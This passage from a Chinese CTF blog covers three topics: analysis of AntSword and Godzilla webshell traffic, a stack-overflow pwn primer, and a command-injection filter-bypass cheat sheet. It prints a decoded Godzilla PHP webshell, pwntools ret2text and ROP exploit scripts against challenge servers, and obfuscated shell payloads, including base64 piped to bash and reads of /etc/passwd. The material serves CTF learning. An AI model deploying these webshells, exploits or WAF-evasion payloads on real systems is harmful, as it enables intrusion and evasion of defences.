<p>echo “69ff5”.”8ed3f0”;echo @asenc($output);echo “94”.”d8f”;}ob_start();try{$p&#x3D;base64_decode(substr($_POST[“g883299482ed9b”],2));$s&#x3D;base64_decode(substr($_POST[“h37e8ca57159a8”],2));$envstr&#x3D;@base64_decode(substr($_POST[“yba4b314a083ba”],2));$d&#x3D;dirname($_SERVER[“SCRIPT_FILENAME”]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;”&#x2F;“?”-c &quot;{$s}&quot;“:”&#x2F;c &quot;{$s}&quot;“;if(substr($d,0,1)&#x3D;&#x3D;”&#x2F;“)</p>
<p>也就是说code中的69ff58ed3f0是无用数据，因此secret中的内容为Y0UAr3G00D</p>
<p>因此flag为flag{Y0UAr3G00D}</p>
<p>来自于蓝桥杯的蚁剑流量分析</p>
<h1 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h1><p>流量特征</p>
<p>哥斯拉的作者应该还没有意识到，在请求包的Cookie中有一个非常致命的特征，最后的分号</p>
<p>通过Burp抓包可知，第1个请求会发送大量数据，该请求不含有任何Cookie信息，服务器响应报文不含任何数据，但是会设置PHPSESSID，后续请求都会自动带上该Cookie</p>
<p><a href="https://blog.csdn.net/sinat_31884905/article/details/132548617">【流量分析】Godzilla分析_哥斯拉流量特征-CSDN博客</a></p>
<p>追踪http流发现了哥斯拉特征的流量</p>
<p><img src="https://s2.loli.net/2024/04/09/aCjBYS48IhtGdfl.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfsogood=eval%28base64_decode%28strrev%28urldecode%28%27K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciZjNjY0UGOiFjZ3IWZxIDNn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cCbsVGazlnYhJ2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD%27%29%29%29%29%3B&amp;babyshell=X1QRClgCfwNVADZmM2NmQFdCEQ%3D%3D</span><br></pre></td></tr></table></figure>

<p>url解密一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfsogood=eval(base64_decode(strrev(urldecode(&#x27;K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7ciZjNjY0UGOiFjZ3IWZxIDNn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cCbsVGazlnYhJ2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD&#x27;))));&amp;babyshell=X1QRClgCfwNVADZmM2NmQFdCEQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到是先对密文反转再base64解密，我们把密文还原回来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;babyshell&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;421eb7f1b8e4b3cf&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后利用脚本和key的值解密流量，脚本如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function encode($D,$K)&#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($D);$i++)&#123;</span><br><span class="line">        $c = $K[$i+1&amp;15];</span><br><span class="line">        $D[$i] = $D[$i]^$c;</span><br><span class="line">    &#125;</span><br><span class="line">    return $D;</span><br><span class="line">&#125;</span><br><span class="line">$key=&#x27;421eb7f1b8e4b3cf&#x27;;</span><br><span class="line">// 原来的数据去掉前十六位和后十六位然后解密</span><br><span class="line">echo gzdecode(encode(base64_decode(&#x27;LbptYjdmMWI4ZoE2+A3FBCZs8s3/2PKxBId+Ti9TYqEws0G3+2AoASrxIHKj1YzjPb7Dr3sBAkH1g858newT2sfwTSDhfJY0IF2CdahBjZ16Kydte4fnA4ps5GEFQjcVGnE0IpcU4Fhy2PQplI6Bmid+UEeQ7+l+IkttmQi88ozihsYl7HKuKxPbiN675JjdBkAYucb3qvrEht15LKltihso4gQulwf693htj4qZ9gYgnBI85pO1fMHDmRl1mNzRiY/IycrkHviqK6VPyzM/xETbxrry6NaBDGyD07akCSc+LEKjrBLUDyo2qxnpgl7F8PFRZhdmQTMsHAeBuMetHgZUq9um/e+B1+xdz6PAJXMEMfd+u7KkZDQiAUZotEuccxGuqaIDnJa9ZqLolU9zKWsHsW4LBvhk6DQoYVmZrOZeFWgOTPS3cBO48txKi52SiSKiGz2lneeykFY8PY7x7YsejsgsCbH9I3VOsDnMCTbb2VnfH5yOkcMitb41pGnSWf6/RRkkqpeNwo7On43IxDXNSS7+ak65xLLQqaaYx0HN2KfjS5qBw7dn49advozy0wdX5UmfrZbc34YvQ5/D1LXfkLPMKbKd0TrFHNO3oGVQoxY95NwbdA9STRHvkF9PLOPHXoYH6L3m66WwEv2suIxm+qpGyr+5fw+NfXOo8u0/+H9LrQj72PZtkVuwY+aRriLNqw03AyEa3GDKmfJ9oGMEtkenLXdkMfGzNvp3P/+SdYzHGnrdFBArShsNJzAJPTwQvnhHsIIRBjBiMw==&#x27;),$key));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意要先去掉密文的前16位和后16位，比如密文为</p>
<p>8dddd282f7b5125bLbptYjdmMWI4Zv+tNWMh6e5IZ2I3Zg&#x3D;&#x3D;6b1ce45ad828e150</p>
<p>需要解密的内容为LbptYjdmMWI4Zv+tNWMh6e5IZ2I3Zg&#x3D;&#x3D;</p>
]]></content>
      <tags>
        <tag>misc</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn入门</title>
    <url>/2024/04/05/pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>二进制安全新手</p>
<span id="more"></span>

<p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>CALL 指令：</p>
<p>CALL 指令用于调用一个子程序（或称为过程或函数）。它实现了一种跳转到其他代码块执行的机制，但与 JMP 不同，CALL 在执行跳转之前会将当前指令的下一条指令地址入栈，以便在子程序执行完毕后能够返回到调用点。这为程序的模块化和结构化提供了基础，使得代码更易于理解和维护。</p>
<p>RET 指令：</p>
<p>RET 指令与 CALL 相对应，用于从子程序中返回到调用点。它从栈中弹出之前保存的返回地址，将程序的控制流恢复到调用点，实现了子程序的返回操作。RET 的使用使得程序能够方便地从一个子程序切换回到主程序，完成所需的计算和任务。</p>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
<p><strong>栈从高地址向低地址生长，ebp高地址，esp低地址，</strong></p>
<p>rbp 64 位寄存器 ebp 32 位寄存器</p>
<p>由此可见 main函数的返回地址在 rbp+8的地址上</p>
<p>bss段<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。</p>
<p>bss是英文Block Started by Symbol的简称。</p>
<p>bss段属于静态内存分配。<br>比如</p>
<p>int a;</p>
<p>data段<br>数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。</p>
<p>数据段属于静态内存分配。<br>比如</p>
<p>int a&#x3D; 1<br>text段<br>代码段（code segment&#x2F;text segment）通常是指用来存放程序执行代码的一块内存区域。</p>
<p>这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读(某些架构也允许代码段为可写，即允许修改程序)。</p>
<p>在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>heap<br>堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。</p>
<p>当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；</p>
<p>当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</p>
<p>stack<br>栈又称堆栈，是用户存放程序临时创建的局部变量，</p>
<p>也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。</p>
<p>除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。</p>
<p>由于栈的先进先出(FIFO)特点，所以栈特别方便用来保存&#x2F;恢复调用现场。</p>
<p>从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。</p>
<p>一般般来说，我们会有如下的覆盖需求</p>
<ul>
<li><p><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</p>
</li>
<li><p><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</p>
</li>
<li><p><strong>覆盖 bss 段某个变量的内容</strong>。</p>
</li>
<li><p>根据现实执行情况，覆盖特定的变量或地址的内容。</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>jarvisoj_level0，可在buuctf网站中下载。首先使用checksec工具查看它开了啥保护措施，基本全关。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/1.jpg" alt="1.jpg"></p>
<p>然后我们使用ida查看一下该程序，程序很简单,有明显的栈溢出漏洞和后门函数，后门函数地址就为0x40059A。</p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/2.jpg" alt="2.jpg"></p>
<p><img src="https://wiki.wgpsec.org/images/ret2text/3.jpg" alt="3.jpg"></p>
<p>ida帮我们计算出来了buf字符串距离rbp有0x80个字节，由于rbp本身还占8个字节，所以溢出0x88个字节后将返回地址修改为后门函数的地址exp如下。</p>
<p>手动打断点调试如下</p>
<p><img src="https://s2.loli.net/2024/04/07/W1R2hABJXKDn8fE.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./level0&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27644</span>)</span><br><span class="line">sys_addr = <span class="number">0x40059A</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="nx-保护"><a href="#nx-保护" class="headerlink" title="nx 保护"></a>nx 保护</h2><p>hahaha</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec ./hahaha</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/mILyK4DRT3tABPV.png"></p>
<p>程序为64位elf文件，开启NX保护。</p>
<p>仅仅64 位的文件需要，32位直接打</p>
<p>payload形式为：nop + p(rdi | ret) + p(system_addr) + p(bin_sh)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary hahaha</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/23/RlaXbiVpeLErJfn.png"></p>
<p>system_addr</p>
<p><img src="https://s2.loli.net/2024/04/23/NFL8Sm5P4vdZsM9.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;120.46.59.242&#x27;</span>,<span class="number">2103</span>)</span><br><span class="line">system_addr = <span class="number">0x400460</span></span><br><span class="line">pop_rdi = <span class="number">0x0400643</span></span><br><span class="line">bin_sh = <span class="number">0x0400664</span></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x30</span>+<span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span> * padding+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">r.sendline(pay)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">https://blog.csdn.net/weixin_39194641/article/details/101113761</a>)</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://blog.csdn.net/weixin_39194641/article/details/101113761">CTF中的PWN——绕NX防护1（本地libc 栈溢出）_ctf的pwn中nx为什么-CSDN博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上） - 知乎 (zhihu.com)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本 ROP - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a>)</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行</title>
    <url>/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p> 命令执行技巧</p>
<span id="more"></span>

<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command1 | command2 # 管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行</span><br><span class="line">command1 || command2 # 如果1执行出错，则会执行2</span><br><span class="line">command1 &amp; command2 # 先执行1，不管成功与否都会执行2</span><br><span class="line">command1 &amp;&amp; command2 # 先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2</span><br></pre></td></tr></table></figure>

<h2 id="bash-中的其他特殊符号"><a href="#bash-中的其他特殊符号" class="headerlink" title="bash 中的其他特殊符号"></a>bash 中的其他特殊符号</h2><p><img src="/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/forzhou\source_posts\2024\04\命令执行\20211029180119.png"></p>
<p><img src="/2024/04/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/forzhou\source_posts\2024\04\命令执行\20240224142449-69b3c9b4-d2dd-1.png"></p>
<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="空格的过滤"><a href="#空格的过滤" class="headerlink" title="空格的过滤"></a>空格的过滤</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$IFS  # 不推荐</span><br><span class="line">$&#123;IFS&#125; </span><br><span class="line">$IFS$9 </span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;</span><br><span class="line">%09 # 制表符Tab键</span><br></pre></td></tr></table></figure>

<p><strong>$()干扰</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(echo c)at /etc/passwd</span><br><span class="line">$(echo l)$(echo s)</span><br></pre></td></tr></table></figure>

<p>cat &#x2F;etc$u&#x2F;passwd</p>
<h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>假设题目过滤 <code>flag.php</code> 关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH</span><br><span class="line"></span><br><span class="line">cat fl\ag.php # 反斜线转义</span><br><span class="line">cat fl&#x27;&#x27;ag.php # 单引号分割</span><br><span class="line">cat fl&quot;&quot;ag.php # 双引号分割</span><br><span class="line">echo Y2F0IGZsYWcucGhw |base64 -d |bash # base64编码</span><br><span class="line">echo 63617420666c61672e706870 | xxd -r -p | bash # hex 编码</span><br><span class="line">cat f[l]ag.php # 通配符</span><br><span class="line">cat f[k-m]ag.php  # 通配符</span><br><span class="line">cat f?ag.php   # 通配符</span><br><span class="line">cat fla*.php # 通配符</span><br><span class="line">cat f&#123;k..m&#125;ag.php # 通配符</span><br><span class="line">a=fl;cat $&#123;a&#125;ag.php # 变量做拼接</span><br><span class="line">a=fl;b=ag;cat $a$b.php # 变量做拼接</span><br><span class="line">cat `echo -n 666c61672e706870|xxd -r -p` # 内敛执行</span><br><span class="line">echo -n 666c61672e706870|xxd -r -p | xargs cat # 内敛执行</span><br></pre></td></tr></table></figure>

<h4 id="1-变量拼接："><a href="#1-变量拼接：" class="headerlink" title="1.变量拼接："></a>1.变量拼接：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure>

<h4 id="3-base64编码绕过："><a href="#3-base64编码绕过：" class="headerlink" title="3.base64编码绕过："></a>3.base64编码绕过：</h4><p>使用反引号包含base64解码后的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d</span><br></pre></td></tr></table></figure>

<p>将base64解码后的命令通过管道符传递给bash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWcudHh0Cg==&quot; | base64 -d | bash</span><br></pre></td></tr></table></figure>

<h4 id="4-单引号，双引号"><a href="#4-单引号，双引号" class="headerlink" title="4.单引号，双引号"></a>4.单引号，双引号</h4><p>单引号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca&#x27;&#x27;t fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure>

<p>双引号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca&quot;&quot;t fla&quot;&quot;g.php</span><br></pre></td></tr></table></figure>

<h4 id="5-反斜杠"><a href="#5-反斜杠" class="headerlink" title="5.反斜杠"></a>5.反斜杠</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca\t fla\g.php</span><br></pre></td></tr></table></figure>

<h4 id="6-1"><a href="#6-1" class="headerlink" title="6.$1"></a>6.$1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ca$1t fl$1ag.p$1hp</span><br></pre></td></tr></table></figure>

<h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><p>可以尝试上面关键字过滤的方法，也可以使用如下命令做等价替换:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings:读取其中字符串</span><br><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep绕过关键词过滤</span><br><span class="line">用法：</span><br><span class="line">grep &#123; flag.php</span><br><span class="line">grep &#123; f???????</span><br><span class="line">打印flag.php中含有&#123;的行。</span><br></pre></td></tr></table></figure>



<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\163\157\162\164&#x27;</span><br><span class="line">`printf &quot;\154\163&quot;` ---八进制</span><br><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line">printf &quot;\154\163&quot; | bash</span><br><span class="line">printf &quot;\154\164&quot; | $0</span><br><span class="line">\x --十六进制</span><br><span class="line">\u --unicode</span><br></pre></td></tr></table></figure>

<h3 id="利用PATH绕过"><a href="#利用PATH绕过" class="headerlink" title="利用PATH绕过"></a>利用PATH绕过</h3><p>可以通过截断和拼接来得到我们想要的来getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125; //l</span><br><span class="line">$&#123;PATH:2:1&#125; //s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令</span><br><span class="line">$&#123;PATH:5:1&#125;s //拼接后是ls,执行命令</span><br></pre></td></tr></table></figure>

<h2 id="字符绕过"><a href="#字符绕过" class="headerlink" title="字符绕过"></a>字符绕过</h2><p><strong>语法：</strong></p>
<table data-anchor-id="tmve"><thead><tr><td>字符</td><td>解释</td></tr></thead><tbody><tr><td><p>*</p></td><td><p>匹配任意长度任意字符</p></td></tr><tr><td><p>?</p></td><td><p>匹配任意单个字符</p></td></tr><tr><td><p>[list]</p></td><td><p>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</p></td></tr><tr><td><p>[^list]</p></td><td><p>匹配指定范围外的任意单个字符或字符集合</p></td></tr><tr><td><p>[!list]</p></td><td><p>同 [^list]</p></td></tr><tr><td><p>{str1,str2,…}</p></td><td><p>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</p></td></tr></tbody></table>

<p><strong>专用字符集</strong></p>
